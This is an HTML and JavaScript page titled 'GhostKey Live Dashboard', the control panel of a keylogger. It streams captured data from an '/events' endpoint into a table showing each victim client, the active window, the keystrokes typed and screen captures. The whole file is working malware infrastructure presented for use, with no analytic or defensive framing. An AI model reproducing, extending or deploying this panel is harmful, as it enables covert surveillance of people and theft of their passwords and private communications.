<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>GhostKey Dashboard</title><style>:root{--bg:#040506;--text:#e5e5e5;--text-muted:#7f8c8d;--border:#151822;--accent:#26ff80}body{background:#040506;color:var(--text);font-family:Consolas,monospace;margin:0;padding:20px}.dot{width:14px;height:14px;background:#26ff80;border-radius:50%;display:inline-block}table{width:100%;border-collapse:collapse;margin-top:20px}th,td{border-bottom:1px solid #333;padding:10px;text-align:left}th{background:#111;color:#888;font-weight:normal}.screenshot{width:150px;height:84px;object-fit:cover;cursor:pointer;border:1px solid #333;border-radius:6px}.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);justify-content:center;align-items:center;z-index:999}<.modal img{max-width:95%;max-height:95vh;border-radius:8px}</style></head><body>
<h1><span class="dot"></span> GhostKey Live Dashboard</h1>
<table><thead><tr><th>#</th><th>Time</th><th>Client</th><th>Window</th><th>Keys</th><th>Screenshot</th></tr></thead><tbody id="logs"><tr><td colspan="6">Waiting for logs...</td></tr></tbody></table>
<div id="modal" class="modal" onclick="this.style.display='none'"><img id="full"></div>
<script>
let id=1;const tbody=document.getElementById("logs");
const es=new EventSource("/events");
es.onmessage=e=>{try{const d=JSON.parse(e.data);
const row=document.createElement("tr");
row.innerHTML=`<td>${id++}</td><td>${d.ts||new Date().toISOString().slice(0,19).replace("T"," ")}</td><td>${d.client}</td><td>${d.win||"Browser"}</td><td>${(d.keys||[]).join("")}</td><td>${d.Screenshot?`<img class="screenshot" src="${d.Screenshot}" onclick="document.getElementById('full').src=this.src;document.getElementById('modal').style.display='flex'">`:"â€”"}</td>`;
tbody.insertBefore(row,tbody.firstChild);
}catch{}}
</script></body></html>
